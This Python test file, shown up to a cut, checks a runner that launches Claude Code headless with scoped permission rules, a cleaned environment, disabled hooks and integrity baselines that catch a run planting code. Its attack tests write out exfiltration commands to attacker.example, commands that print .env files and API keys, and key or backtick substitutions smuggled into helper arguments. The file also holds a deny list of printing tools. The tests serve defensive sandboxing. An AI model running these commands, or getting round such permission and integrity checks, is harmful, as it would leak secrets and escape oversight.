"""Task 14: run Claude Code headless in the studio folder, track progress, fail safely.

Every test runs the real subprocess path against fixtures/fake_claude.py, put first on
PATH as `claude` (POSIX shell shim) or `claude.cmd` (Windows shim)."""
import hashlib
import http.client
import importlib.util
import json
import os
import re
import shutil
import subprocess
import sys
import tempfile
import threading
import time
import unittest
from http.server import ThreadingHTTPServer
from pathlib import Path
from unittest.mock import patch

import claude_runner as runner
import integrity
import looks
import library
import project_index as index
from serve import Handler

FAKE = Path(__file__).resolve().parent / 'fixtures' / 'fake_claude.py'
REPO = Path(__file__).resolve().parents[1]
# Written out by hand (not built from the runner's constants): RULINGS R48 + R51 + R53's exact rule set.
EDIT_HELPERS = ['progress.py', 'prepare_media.py', 'transcribe.py', 'new_version.py', 'cut.py', 'captions.py',
                'matte.py', 'register_version.py', 'hf.py check', 'hf.py render', 'hf.py --help',
                'addons_voice.py', 'addons_image.py', 'media.py ffmpeg', 'media.py ffprobe']
NO_WRITE = ['**/*.py', '**/*.pyw', '**/*.pyc', '**/*.pyd', '**/*.pth', '**/*.js', '**/*.mjs', '**/*.cjs',
            '**/*.bat', '**/*.cmd', '**/*.exe', '**/*.com', '**/*.ps1', '**/*.vbs', '**/*.wsf',
            '**/scripts/**', '**/CLAUDE*.md', '**/AGENTS.md', '**/.claude/**', '**/.mcp.json']
SETTINGS = '{"disableAllHooks":true,"autoMemoryEnabled":false}'
COMMON_DENY = ['Read(.env)', 'Read(.env.*)', 'Read(.[eE][nN][vV]*)', 'Edit(.env)', 'Edit(.env.*)', 'Edit(.[eE][nN][vV]*)']
PRINTERS = ['cat', 'head', 'tail', 'less', 'more', 'sed', 'awk', 'strings', 'od', 'xxd', 'hexdump', 'base64',
            'sort', 'uniq', 'diff', 'cmp', 'comm', 'tac', 'nl', 'rev', 'tr', 'fold', 'paste', 'column',
            'grep', 'egrep', 'fgrep', 'rg', 'git', 'env', 'printenv', 'export', 'declare', 'unset', 'ffmpeg', 'ffprobe']
BASH_DENY = [f'Bash({name}:*)' for name in PRINTERS] + ['Bash(set)', 'Bash(*$*)', 'Bash(*`*)',
                                                         'Bash(cd)', 'Bash(cd *)', 'Bash(pushd *)', 'Bash(popd*)']


def expected_allow(folder, helpers, studio):
    rules = ['Read(./**)', f'Edit(./{folder}/**)']
    for helper in helpers:
        script, _, rest = helper.partition(' ')
        rules += [f'Bash({python} "{studio}/scripts/{script}"' + (f' {rest}' if rest else '') + ' *)'
                  for python in ('python', 'python3')]
    return rules


def studio_form(command, studio):
    """A documented command as the model writes it in this studio."""
    return command.replace('<studio>', studio)


def bash_rule_matches(rule, command):
    """Claude Code's documented Bash matching (code.claude.com/docs/en/permissions, "Wildcard
    patterns"): `*` is any text including spaces; `x:*` is `x *`; a trailing ` *` that is the
    only wildcard also matches the bare command. (Compound-command splitting is not modelled:
    every skill command is one command.)"""
    pattern = rule[len('Bash('):-1]
    if pattern.endswith(':*'):
        pattern = pattern[:-2] + ' *'
    if pattern.endswith(' *') and pattern.count('*') == 1:
        return command == pattern[:-2] or command.startswith(pattern[:-1])
    return re.fullmatch('.*'.join(map(re.escape, pattern.split('*'))), command, re.S) is not None


def load_check_skills():
    spec = importlib.util.spec_from_file_location('studio_check_skills_r', REPO / 'scripts' / 'check_skills.py')
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


def install_fake(folder):
    """Put a `claude` shim for fake_claude.py in `folder` (a name with a space, like a real user profile)."""
    folder.mkdir(parents=True, exist_ok=True)
    if os.name == 'nt':
        (folder / 'claude.cmd').write_text(f'@echo off\r\n"{sys.executable}" "{FAKE}" %*\r\n', encoding='utf-8')
    else:
        shim = folder / 'claude'
        shim.write_text(f'#!/bin/sh\nexec "{sys.executable}" "{FAKE}" "$@"\n', encoding='utf-8')
        shim.chmod(0o755)


class RunnerBase(unittest.TestCase):
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory()
        self.root = Path(self.temp.name).resolve()
        self.base = self.root / 'style-library'
        self.base.mkdir()
        self.bin = self.root / 'fake bin'
        install_fake(self.bin)
        self.registry = self.base / 'projects.json'
        self.registry.write_text(json.dumps({'schema_version': 1, 'projects': [
            {'id': 'reel-one', 'title': 'Reel one', 'kind': 'talking-head', 'video_language': 'he', 'state': 'draft'},
            {'id': 'quiet-one', 'title': 'Quiet one', 'kind': 'faceless', 'video_language': 'he', 'state': 'draft'},
            {'id': 'odd-one', 'title': 'Odd one', 'kind': 'mystery', 'video_language': 'he', 'state': 'draft'},
            {'id': 'bare-one', 'title': 'Bare one', 'video_language': 'he', 'state': 'draft'},
        ]}), encoding='utf-8')
        for project in ('reel-one', 'quiet-one'):
            (self.root / 'projects' / project).mkdir(parents=True)
        (self.base / 'catalog.json').write_text(json.dumps({'schema_version': 4, 'techniques': [], 'entries': [
            {'id': 'ref-one', 'title': 'A reference', 'collection': 'outside'}]}), encoding='utf-8')
        (self.root / 'references' / 'ref-one').mkdir(parents=True)
        self.patches = [
            patch.object(runner, 'STUDIO', self.root),
            patch.object(index, 'STUDIO', self.root),
            patch.object(index, 'REGISTRY', self.registry),
            patch.object(library, 'BASE', self.base),
            patch.object(library, 'STUDIO', self.root),
            patch.dict(os.environ, {'PATH': str(self.bin) + os.pathsep + os.environ.get('PATH', '')}),
        ]
        for p in self.patches:
            p.start()
        for name in ('FAKE_CLAUDE_RECORD', 'FAKE_CLAUDE_STEPS', 'FAKE_CLAUDE_OUTPUT', 'FAKE_CLAUDE_SLEEP', 'FAKE_CLAUDE_EXIT',
                     'FAKE_CLAUDE_WRITE'):
            os.environ.pop(name, None)
        integrity.write_baseline(self.root)  # R51: a run starts only on an unchanged studio

    def tearDown(self):
        for job in list(runner._PROCS):
            try:
                runner.cancel(job)
            except runner.RunnerError:
                pass
        for job, proc in list(runner._PROCS.items()):
            proc.wait(timeout=20)
        for thread in list(runner._WATCHERS.values()):
            thread.join(timeout=20)
        runner._PROCS.clear()
        runner._WATCHERS.clear()
        for p in reversed(self.patches):
            p.stop()
        self.temp.cleanup()

    def fake(self, **env):
        os.environ.update({'FAKE_CLAUDE_' + key.upper(): str(value) for key, value in env.items()})

    def finish(self, job, timeout=30):
        deadline = time.monotonic() + timeout
        while time.monotonic() < deadline:
            result = runner.status(job)
            if result['state'] != 'running':
                watcher = runner._WATCHERS.get(job)
                if watcher:
                    watcher.join(timeout=10)
                return runner.status(job)
            time.sleep(0.1)
        self.fail('job did not finish')

    def write_record(self, **fields):
        logs = self.root / 'logs'
        logs.mkdir(exist_ok=True)
        job = fields.pop('job', 'a' * 32)
        record = {'job': job, 'task': 'edit', 'project': 'reel-one', 'reference': None, 'target': 'projects/reel-one',
                  'state': 'running', 'message_key': None, 'exit_code': None, 'started': time.time() - 60}
        record.update(fields)
        (logs / 'jobs.json').write_text(json.dumps({'jobs': {job: record}}), encoding='utf-8')
        return job

    def saved_state(self, job):
        return json.loads((self.root / 'logs' / 'jobs.json').read_text(encoding='utf-8'))['jobs'][job]['state']

    def wait_for(self, path, timeout=30):
        deadline = time.monotonic() + timeout
        while time.monotonic() < deadline:
            if path.exists() and path.stat().st_size:
                return json.loads(path.read_text(encoding='utf-8'))
            time.sleep(0.1)
        self.fail('fake claude never started')


class ClaudeRunnerTest(RunnerBase):
    def test_missing_claude_raises_409(self):
        empty = self.root / 'empty'
        empty.mkdir()
        with patch.dict(os.environ, {'PATH': str(empty)}):
            with self.assertRaises(runner.RunnerError) as caught:
                runner.start('reel-one', 'edit')
        self.assertEqual((caught.exception.status, caught.exception.message_key), (409, 'claude-missing'))

    def test_success_marks_done_and_exposes_steps(self):
        self.fake(steps='ingest,transcribe,cut')
        job = runner.start('reel-one', 'edit')['job']
        result = self.finish(job)
        self.assertEqual(result['state'], 'done')
        self.assertIsNone(result['message_key'])
        self.assertEqual(result['steps'], [{'key': 'ingest', 'state': 'done'}, {'key': 'transcribe', 'state': 'done'},
                                           {'key': 'cut', 'state': 'done'}])
        self.assertTrue((self.root / 'logs' / f'claude-{job}.log').is_file())
        saved = json.loads((self.root / 'logs' / 'jobs.json').read_text(encoding='utf-8'))
        self.assertEqual(saved['jobs'][job]['state'], 'done')
        self.assertIsInstance(saved['jobs'][job]['pid'], int)

    def test_stale_progress_from_an_earlier_run_is_ignored(self):
        progress = self.root / 'projects' / 'reel-one' / 'progress.json'
        progress.write_text(json.dumps([{'key': 'ingest', 'state': 'done'}]), encoding='utf-8')
        old = time.time() - 3600
        os.utime(progress, (old, old))
        job = runner.start('reel-one', 'edit')['job']
        self.assertEqual(self.finish(job)['steps'], [])

    def test_nonzero_exit_marks_failed_with_message(self):
        self.fake(output='Invalid API key · Please run /login', exit=1)
        result = self.finish(runner.start('reel-one', 'edit')['job'])
        self.assertEqual((result['state'], result['message_key']), ('failed', 'claude.not-logged-in'))

    def test_usage_limit_marks_failed_with_limit(self):
        self.fake(output='Claude AI usage limit reached|1762700000', exit=1)
        result = self.finish(runner.start('reel-one', 'edit')['job'])
        self.assertEqual((result['state'], result['message_key']), ('failed', 'claude.limit'))

    def test_other_failure_is_generic(self):
        self.fake(output='Something unexpected broke', exit=2)
        result = self.finish(runner.start('reel-one', 'edit')['job'])
        self.assertEqual((result['state'], result['message_key']), ('failed', 'claude.failed'))

    def test_error_result_with_zero_exit_is_failed(self):
        self.fake(output='{"type":"result","subtype":"success","is_error":true,"result":"Claude AI usage limit reached"}')
        result = self.finish(runner.start('reel-one', 'edit')['job'])
        self.assertEqual((result['state'], result['message_key']), ('failed', 'claude.limit'))

    def test_previous_version_untouched_on_failure(self):
        version = self.root / 'projects' / 'reel-one' / 'versions' / 'v1.mp4'
        version.parent.mkdir()
        version.write_bytes(b'approved cut v1' * 100)
        before = hashlib.sha256(version.read_bytes()).hexdigest()
        self.fake(output='Something unexpected broke', exit=1)
        result = self.finish(runner.start('reel-one', 'edit')['job'])
        self.assertEqual(result['state'], 'failed')
        self.assertEqual(hashlib.sha256(version.read_bytes()).hexdigest(), before)

    def test_server_restart_marks_orphan_stopped(self):
        dead = subprocess.Popen([sys.executable, '-c', 'pass'])
        dead.wait()
        job = self.write_record(pid=dead.pid, created=time.time() - 60)
        self.assertEqual(runner.status(job)['state'], 'stopped')
        self.assertEqual(self.saved_state(job), 'stopped')
        # The project is free again.
        self.assertEqual(self.finish(runner.start('reel-one', 'edit')['job'])['state'], 'done')

    def test_second_job_same_project_busy(self):
        self.fake(sleep=60)
        first = runner.start('reel-one', 'edit')['job']
        with self.assertRaises(runner.RunnerError) as caught:
            runner.start('reel-one', 'edit')
        self.assertEqual((caught.exception.status, caught.exception.message_key), (409, 'busy'))
        # Task 13 fix round 1: the busy reply names the running job so a reloaded page can re-attach.
        self.assertEqual(caught.exception.details, {'job': first})
        other = runner.start('quiet-one', 'edit')['job']
        self.assertNotEqual(first, other)

    def test_cancel_kills_process(self):
        record = self.root / 'record.json'
        self.fake(sleep=60, record=record)
        job = runner.start('reel-one', 'edit')['job']
        fake_pid = self.wait_for(record)['pid']
        self.assertTrue(runner._pid_alive(fake_pid))
        runner.cancel(job)
        self.assertEqual(runner.status(job)['state'], 'stopped')
        deadline = time.monotonic() + 15
        while runner._pid_alive(fake_pid) and time.monotonic() < deadline:
            time.sleep(0.1)
        self.assertFalse(runner._pid_alive(fake_pid))
        self.assertEqual(self.finish(job)['state'], 'stopped')
        runner.cancel(job)  # cancelling a finished job is a no-op

    def argv_of(self, *start_args):
        record = self.root / 'record.json'
        self.fake(record=record)
        self.finish(runner.start(*start_args)['job'])
        return json.loads(record.read_text(encoding='utf-8'))

    def test_project_job_command_line_is_scoped_to_the_project(self):
        seen = self.argv_of('reel-one', 'edit')
        studio = self.root.resolve().as_posix()
        self.assertEqual(seen['argv'], [
            '-p', f'/talking-head projects/reel-one Studio folder: "{studio}". Reply in Hebrew.', '--output-format',
            'stream-json', '--verbose', '--permission-mode', 'dontAsk', '--strict-mcp-config',
            '--setting-sources', 'project', '--settings', SETTINGS, '--tools', 'Read,Glob,Grep,Edit,Write,Bash',
            '--disallowedTools', *COMMON_DENY, 'Read(./references/**)', 'Edit(./projects/reel-one/approval-state.json)',
            'Edit(./projects/reel-one/look.json)',
            *[f'Edit(./projects/reel-one/{pattern})' for pattern in NO_WRITE], *BASH_DENY,
            '--allowedTools', *expected_allow('projects/reel-one', EDIT_HELPERS, studio)])
        self.assertEqual(Path(seen['cwd']).resolve(), self.root)

    def test_helper_rules_hold_for_a_studio_path_with_spaces_and_hebrew(self):
        # G1: the rules name helpers by the absolute studio folder, quoted, as the skills write them.
        studio = Path(tempfile.gettempdir()) / 'סטודיו של יוצר' / 'ai studio'
        allow = runner.allowed_rules('edit', 'projects/reel-one', root=studio)
        base = studio.resolve().as_posix()
        command = f'python "{base}/scripts/progress.py" "projects/reel-one/progress.json" cut running "חותכים"'
        self.assertTrue([r for r in allow if r.startswith('Bash(') and bash_rule_matches(r, command)])
        for shadow in ('python scripts/progress.py "projects/reel-one/progress.json" cut running',
                       f'python "{base}/projects/reel-one/scripts/progress.py" x',
                       f'python {base}/scripts/progress.py x', 'python "scripts/progress.py" x'):
            with self.subTest(shadow=shadow):
                self.assertFalse([r for r in allow if r.startswith('Bash(') and bash_rule_matches(r, shadow)])

    def rules(self, argv):
        deny_at, allow_at = argv.index('--disallowedTools'), argv.index('--allowedTools')
        self.assertLess(deny_at, allow_at)
        self.assertEqual(allow_at, max(i for i, a in enumerate(argv) if a.startswith('--')))  # the last flag
        return argv[deny_at + 1:allow_at], argv[allow_at + 1:]

    def test_no_rule_grants_writes_or_commands_outside_the_job(self):
        for start_args, folder in ((('reel-one', 'edit'), 'projects/reel-one'),
                                   (('quiet-one', 'edit'), 'projects/quiet-one')):
            with self.subTest(folder=folder):
                deny, allow = self.rules(self.argv_of(*start_args)['argv'])
                # No bare tool name: a bare Read/Edit/Write/Bash would approve every path or command.
                self.assertFalse([r for r in allow if '(' not in r])
                self.assertEqual({r.split('(')[0] for r in allow}, {'Read', 'Edit', 'Bash'})
                self.assertEqual([r for r in allow if r.startswith('Edit(')], [f'Edit(./{folder}/**)'])
                self.assertEqual([r for r in allow if r.startswith('Read(')], ['Read(./**)'])
                self.assertFalse([r for r in allow if '..' in r or '~' in r])
                studio = re.escape(self.root.resolve().as_posix())
                self.assertFalse([r for r in allow if r.startswith('Bash(') and not re.fullmatch(
                    r'Bash\(python3? "' + studio + r'/scripts/[a-z_]+\.py"( [a-z-]+)? \*\)', r)])
                for pattern in NO_WRITE:
                    self.assertIn(f'Edit(./{folder}/{pattern})', deny)
                self.assertFalse([r for r in allow if 'ffmpeg' in r and 'media.py' not in r])  # R51: no raw ffmpeg
                for rule in ('Read(.env)', 'Read(.env.*)', 'Read(.[eE][nN][vV]*)', 'Edit(.env)', 'Edit(.env.*)'):
                    self.assertIn(rule, deny)

    def test_the_review_attack_commands_are_not_allowed(self):
        deny, allow = self.rules(self.argv_of('reel-one', 'edit')['argv'])
        bash_allow = [r for r in allow if r.startswith('Bash(')]
        bash_deny = [r for r in deny if r.startswith('Bash(')]
        studio = self.root.resolve().as_posix()
        for command in ('python scripts/progress.py "projects/reel-one/progress.json" cut running',  # G1: relative form
                        f'python "{studio}/projects/reel-one/scripts/progress.py" x',
                        'python scripts/../projects/reel-one/x.py', 'python scripts/cut.py/../../projects/reel-one/x.py',
                        'node node_modules/hyperframes/../../projects/reel-one/x.js', 'python -c "print(1)"',
                        'python scripts/setup.py --yes-to node', 'python scripts/hf.py publish projects/reel-one',
                        'python scripts/check_card.py "references/x"', 'py scripts/cut.py "projects/reel-one"',
                        'python projects/reel-one/x.py', 'npx hyperframes render', 'curl https://attacker.example'):
            with self.subTest(command=command):
                self.assertFalse([r for r in bash_allow if bash_rule_matches(r, command)])
        for command in ('ffmpeg -i "https://attacker.example/?k=1" -f null -', 'ffprobe "http://attacker.example/x"',
                        'ffmpeg -nostdin -f data -i .env -c copy -f data "projects/reel-one/k.txt"',
                        'ffmpeg -nostdin -y -i "a.mp4" "CLAUDE.md"', 'ffmpeg -i "a.mp4" -y "b.mp4"',
                        'ffmpeg -i "a.mp4" "b.mp4" -y', 'ffmpeg -f concat -safe 0 -i "l.txt" "o.mp4"',
                        'ffmpeg -protocol_whitelist file,http -i "a.m3u8" "o.mp4"',
                        'grep -r STUDIO_ .', 'env', 'printenv ANTHROPIC_API_KEY', 'git show HEAD:.env', 'set',
                        'cat .e*', 'head -c 200 .en?', 'tail .env', 'sed -n 1p .e*', 'base64 .e*',
                        'python scripts/progress.py "projects/reel-one/p.json" cut running "$ANTHROPIC_API_KEY"',
                        'python scripts/progress.py "projects/reel-one/p.json" cut running "`printenv`"',
                        'unset STUDIO_JOB_DIR', 'ffmpeg -i a.mp4 b.mp4', 'ffprobe .ENV',
                        'sort .e*', 'export -p', 'declare -x'):
            with self.subTest(command=command):
                self.assertTrue([r for r in bash_deny if bash_rule_matches(r, command)])

    def test_every_command_the_skills_show_is_allowed_and_not_denied(self):
        check_skills = load_check_skills()
        studio = self.root.resolve().as_posix()
        _, texts = check_skills._texts(REPO, 'learn-style')
        self.assertEqual([c for text in texts.values() for c in check_skills._commands(text)], [])  # R53: no shell
        for skill, start_args in (('talking-head', ('reel-one', 'edit')), ('faceless-reel', ('quiet-one', 'edit'))):
            deny, allow = self.rules(self.argv_of(*start_args)['argv'])
            _, texts = check_skills._texts(REPO, skill)
            commands = [studio_form(c, studio) for name, text in texts.items()
                        for c in check_skills._commands(text)
                        if '<studio>/scripts/<' not in c and '<studio>/scripts/…' not in c
                        and not check_skills.PLACEHOLDER.match(c)]
            self.assertGreater(len(commands), 5)
            for command in commands:
                with self.subTest(skill=skill, command=command):
                    self.assertTrue([r for r in allow if r.startswith('Bash(') and bash_rule_matches(r, command)])
                    self.assertFalse([r for r in deny if r.startswith('Bash(') and bash_rule_matches(r, command)])

    def test_the_matcher_follows_the_documented_examples(self):
        # Rows of the docs' wildcard table, so the attack tests above rest on the documented semantics.
        self.assertTrue(bash_rule_matches('Bash(ls *)', 'ls'))
        self.assertTrue(bash_rule_matches('Bash(ls *)', 'ls -la'))
        self.assertFalse(bash_rule_matches('Bash(ls *)', 'lsof'))
        self.assertTrue(bash_rule_matches('Bash(ls:*)', 'ls -la'))
        self.assertTrue(bash_rule_matches('Bash(git * main)', 'git push origin main'))
        self.assertFalse(bash_rule_matches('Bash(* --help *)', 'npm --help'))
        self.assertFalse(bash_rule_matches('Bash(npm run build)', 'npm run build --watch'))

    def test_child_env_drops_the_parent_session_and_keeps_auth(self):
        parent = {'PATH': '/bin', 'HOME': '/home/a', 'USERPROFILE': r'D:\Profiles\a', 'CLAUDECODE': '1', 'CLAUDE_PID': '42',
                  'CLAUDE_CODE_ENTRYPOINT': 'cli', 'CLAUDE_CODE_SESSION_ID': 's', 'CLAUDE_CODE_CHILD_SESSION': '1',
                  'CLAUDE_CODE_MESSAGING_SOCKET': '/tmp/s', 'claude_code_sse_port': '1',
                  'CLAUDE_PROJECT_DIR': '/x', 'CLAUDE_ENV_FILE': '/y', 'STUDIO_VOICE_KEY': 'v', 'STUDIO_IMAGE_KEY': 'i',
                  'ANTHROPIC_API_KEY': 'k', 'ANTHROPIC_BASE_URL': 'https://gw', 'CLAUDE_CONFIG_DIR': '/c',
                  'CLAUDE_CODE_USE_BEDROCK': '1', 'CLAUDE_CODE_USE_VERTEX': '1', 'CLAUDE_CODE_USE_FOUNDRY': '1',
                  'CLAUDE_CODE_SKIP_BEDROCK_AUTH': '1', 'CLAUDE_CODE_OAUTH_TOKEN': 't', 'CLAUDE_CODE_CLIENT_CERT': 'c',
                  'CLAUDE_CODE_CLIENT_KEY': 'ck', 'CLAUDE_CODE_GIT_BASH_PATH': r'C:\Git\bin\bash.exe',
                  'PYTHONIOENCODING': 'cp1255', 'BASH_MAX_TIMEOUT_MS': '7200000'}
        env = runner.child_env(parent)
        for gone in ('CLAUDECODE', 'CLAUDE_PID', 'CLAUDE_CODE_ENTRYPOINT', 'CLAUDE_CODE_SESSION_ID',
                     'CLAUDE_CODE_CHILD_SESSION', 'CLAUDE_CODE_MESSAGING_SOCKET', 'claude_code_sse_port',
                     'CLAUDE_PROJECT_DIR', 'CLAUDE_ENV_FILE', 'STUDIO_VOICE_KEY', 'STUDIO_IMAGE_KEY'):
            self.assertNotIn(gone, env)
        for kept in ('PATH', 'HOME', 'USERPROFILE', 'ANTHROPIC_API_KEY', 'ANTHROPIC_BASE_URL', 'CLAUDE_CONFIG_DIR',
                     'CLAUDE_CODE_USE_BEDROCK', 'CLAUDE_CODE_USE_VERTEX', 'CLAUDE_CODE_USE_FOUNDRY',
                     'CLAUDE_CODE_SKIP_BEDROCK_AUTH', 'CLAUDE_CODE_OAUTH_TOKEN', 'CLAUDE_CODE_CLIENT_CERT',
                     'CLAUDE_CODE_CLIENT_KEY', 'CLAUDE_CODE_GIT_BASH_PATH'):
            self.assertEqual(env[kept], parent[kept])
        self.assertEqual((env['PYTHONUTF8'], env['PYTHONIOENCODING']), ('1', 'utf-8'))
        self.assertEqual((env['BASH_DEFAULT_TIMEOUT_MS'], env['BASH_MAX_TIMEOUT_MS']), ('600000', '7200000'))
        self.assertEqual(parent['CLAUDECODE'], '1')  # the caller's mapping is not changed

    def test_spawned_child_gets_the_clean_env(self):
        session = {'CLAUDECODE': '1', 'CLAUDE_CODE_ENTRYPOINT': 'cli', 'CLAUDE_CODE_SESSION_ID': 'abc',
                   'CLAUDE_CODE_CHILD_SESSION': '1', 'CLAUDE_CONFIG_DIR': str(self.root / 'cfg'),
                   'ANTHROPIC_MODEL': 'x', 'CLAUDE_CODE_USE_BEDROCK': '1'}
        with patch.dict(os.environ, session):
            seen = self.argv_of('reel-one', 'edit')
            self.assertEqual(os.environ['CLAUDECODE'], '1')  # only the child's environment is cleaned
        env = seen['session_env']
        self.assertFalse([k for k in env if k.upper() in ('CLAUDECODE', 'CLAUDE_CODE_ENTRYPOINT',
                                                          'CLAUDE_CODE_SESSION_ID', 'CLAUDE_CODE_CHILD_SESSION')])
        self.assertEqual(env['CLAUDE_CONFIG_DIR'], session['CLAUDE_CONFIG_DIR'])
        self.assertEqual(env['ANTHROPIC_MODEL'], 'x')
        self.assertEqual(env['CLAUDE_CODE_USE_BEDROCK'], '1')
        self.assertEqual((env['PYTHONUTF8'], env['PYTHONIOENCODING']), ('1', 'utf-8'))

    # --- RULING R51: job folder in the env, hooks off, integrity before and after ---

    def test_child_knows_its_job_folder(self):
        with patch.dict(os.environ, {'STUDIO_JOB_DIR': str(self.root / 'elsewhere')}):
            env = self.argv_of('reel-one', 'edit')['session_env']
        self.assertEqual(Path(env['STUDIO_JOB_DIR']), (self.root / 'projects' / 'reel-one').resolve())
        # Not set: Claude Code would force the permission mode back to default (live-checked).
        self.assertNotIn('CLAUDE_CODE_SUBPROCESS_ENV_SCRUB', env)

    def test_hooks_are_off_for_the_run(self):
        argv = self.argv_of('reel-one', 'edit')['argv']
        settings = argv[argv.index('--settings') + 1]
        # Survived the Windows .cmd shim intact; B2: auto memory off as well.
        self.assertEqual(json.loads(settings), {'disableAllHooks': True, 'autoMemoryEnabled': False})

    def test_round4_child_env_closes_the_current_folder_lookup_and_auto_memory(self):
        env = runner.child_env({'PATH': '/bin'})
        self.assertEqual(env['NoDefaultCurrentDirectoryInExePath'], '1')  # B1
        self.assertEqual(env['CLAUDE_CODE_DISABLE_AUTO_MEMORY'], '1')     # B2
        seen = self.argv_of('reel-one', 'edit')['session_env']
        self.assertEqual(seen['CLAUDE_CODE_DISABLE_AUTO_MEMORY'], '1')

    def test_round4_cd_and_launchers_are_denied(self):
        deny, _ = self.rules(self.argv_of('reel-one', 'edit')['argv'])
        for command in ('cd projects/reel-one', 'cd', 'pushd projects/reel-one', 'popd'):
            with self.subTest(command=command):
                self.assertTrue([r for r in deny if r.startswith('Bash(') and bash_rule_matches(r, command)])
        for name in ('ffmpeg.bat', 'x.cmd', 'x.exe', 'x.ps1', 'AGENTS.md'):
            self.assertIn(f'Edit(./projects/reel-one/**/{name.split(".")[0] if name == "AGENTS.md" else "*." + name.split(".")[1]}'
                          + ('.md)' if name == 'AGENTS.md' else ')'), deny)

    def test_round4_a_reference_look_is_copied_into_look_json(self):
        ref = self.root / 'references' / 'ref-one'
        fields = {key: f'{key} value' for key in looks.REQUIRED_KEYS}
        fields['hook'] = 'first line' + chr(10) + 'second' + chr(7) + chr(0x202e) + ' line ' + 'x' * 400
        (ref / 'style-card.md').write_text('---' + chr(10) + ''.join(f'{k}: {v}' + chr(10) for k, v in fields.items())
                                           .replace('first line' + chr(10) + 'second', 'first line second') + '---' + chr(10),
                                           encoding='utf-8')
        project = self.root / 'projects' / 'reel-one'
        (project / 'choices.json').write_text(json.dumps({'look': 'ref:ref-one'}), encoding='utf-8')
        import reference_intake
        catalog = json.loads((self.base / 'catalog.json').read_text(encoding='utf-8'))
        catalog['entries'][0]['collection'] = 'reference'  # a creator reference ("השראה")
        (self.base / 'catalog.json').write_text(json.dumps(catalog), encoding='utf-8')
        with patch.object(reference_intake, 'CATALOG', self.base / 'catalog.json'):
            argv = self.argv_of('reel-one', 'edit')['argv']
        look = json.loads((project / 'look.json').read_text(encoding='utf-8'))
        self.assertEqual(set(look['values']), set(looks.REQUIRED_KEYS))
        self.assertEqual(look['look'], 'ref:ref-one')
        for value in look['values'].values():
            self.assertLessEqual(len(value), 300)
            self.assertFalse([c for c in value if ord(c) < 32 or 0x202a <= ord(c) <= 0x202e])
        self.assertIn('Read(./references/**)', argv)  # the run reads look.json, never the reference
        (project / 'choices.json').write_text(json.dumps({'look': 'soft'}), encoding='utf-8')
        self.argv_of('reel-one', 'edit')
        self.assertFalse((project / 'look.json').exists())  # a built-in look: no stale copy

    def planted_run(self, relative):
        self.fake(write=relative)
        job = runner.start('reel-one', 'edit')['job']
        return self.finish(job)

    def test_a_run_that_plants_code_fails_and_blocks_the_next_start(self):
        for relative in ('scripts/json.py', '.claude/settings.local.json', 'CLAUDE.local.md', '.claude/skills/x/SKILL.md'):
            with self.subTest(relative=relative):
                integrity.write_baseline(self.root)
                status = self.planted_run(relative)
                self.assertEqual((status['state'], status['message_key']), ('failed', 'claude.studio-changed'))
                self.assertIn(relative, status['changed'])
                with self.assertRaises(runner.RunnerError) as caught:
                    runner.start('quiet-one', 'edit')
                self.assertEqual((caught.exception.status, caught.exception.message_key), (409, 'claude.studio-changed'))
                self.assertIn(relative, caught.exception.details['files'])
                self.assertTrue((self.root / relative).exists(), 'nothing is ever deleted')
                (self.root / relative).unlink()

    def test_a_changed_shipped_file_blocks_the_start(self):
        (self.root / 'release-files.txt').write_text('style-library/tool.py\n', encoding='utf-8')
        (self.base / 'tool.py').write_text('x = 1\n', encoding='utf-8')
        integrity.write_baseline(self.root)
        (self.base / 'tool.py').write_text('x = 2\n', encoding='utf-8')
        with self.assertRaises(runner.RunnerError) as caught:
            runner.start('reel-one', 'edit')
        self.assertEqual(caught.exception.details['files'], ['style-library/tool.py'])

    def test_without_a_baseline_an_unverified_tree_is_refused(self):
        (self.root / 'logs' / 'integrity.json').unlink()
        with self.assertRaises(runner.RunnerError) as caught:
            runner.start('reel-one', 'edit')
        self.assertEqual(caught.exception.message_key, 'claude.studio-changed')
        self.assertEqual(caught.exception.details['files'], ['logs/integrity.json'])

    def test_long_bash_commands_get_long_timeouts(self):
        # matte and render run in the foreground with the Bash timeout parameter (up to an hour).
        record = self.root / 'record.json'
        self.fake(record=record)
        with patch.dict(os.environ):
            os.environ.pop('BASH_DEFAULT_TIMEOUT_MS', None)
            os.environ.pop('BASH_MAX_TIMEOUT_MS', None)
            self.finish(runner.start('reel-one', 'edit')['job'])
            self.assertNotIn('BASH_DEFAULT_TIMEOUT_MS', os.environ)  # only the child gets them
        self.assertEqual(json.loads(record.read_text(encoding='utf-8'))['env'],
                         {'BASH_DEFAULT_TIMEOUT_MS': '600000', 'BASH_MAX_TIMEOUT_MS': '3600000'})

    def test_bash_timeouts_already_set_are_kept(self):
        record = self.root / 'record.json'
        self.fake(record=record)
        with patch.dict(os.environ, {'BASH_DEFAULT_TIMEOUT_MS': '1000', 'BASH_MAX_TIMEOUT_MS': '7200000'}):
            self.finish(runner.start('reel-one', 'edit')['job'])
        self.assertEqual(json.loads(record.read_text(encoding='utf-8'))['env'],
                         {'BASH_DEFAULT_TIMEOUT_MS': '1000', 'BASH_MAX_TIMEOUT_MS': '7200000'})

    def test_prompt_follows_kind_task_and_language(self):
        record = self.root / 'record.json'
        self.fake(record=record)
        library.set_ui_language('en')
        self.finish(runner.start('quiet-one', 'edit')['job'])
        self.assertEqual(json.loads(record.read_text(encoding='utf-8'))['argv'][1],
                         f'/faceless-reel projects/quiet-one Studio folder: "{self.root.resolve().as_posix()}". '
                         'Reply in English.')

    def test_a_missing_baseline_after_earlier_runs_is_never_recreated(self):
        # G5: only a first run may write a missing baseline; later, a deleted one blocks.
        self.finish(runner.start('reel-one', 'edit')['job'])
        (self.root / 'logs' / 'integrity.json').unlink()
        with patch.object(integrity, '_release_check_passes', return_value=True):
            with self.assertRaises(runner.RunnerError) as caught:
                runner.start('reel-one', 'edit')
        self.assertEqual(caught.exception.details['files'], ['logs/integrity.json'])
        self.assertFalse((self.root / 'logs' / 'integrity.json').exists())

    def test_a_run_that_rewrites_the_baseline_is_still_caught(self):
        # G5: the start snapshot lives in the server's memory, not in a file the run can edit.
        status = self.planted_run('logs/integrity.json')
        self.assertEqual((status['state'], status['message_key']), ('failed', 'claude.studio-changed'))
        with self.assertRaises(runner.RunnerError):
            runner.start('quiet-one', 'edit')  # tripped: blocked until a deliberate re-baseline
        integrity.write_baseline(self.root)
        self.finish(runner.start('quiet-one', 'edit')['job'])

    # --- Fix round 1 ---

    def test_reused_pid_is_stopped_and_never_killed(self):
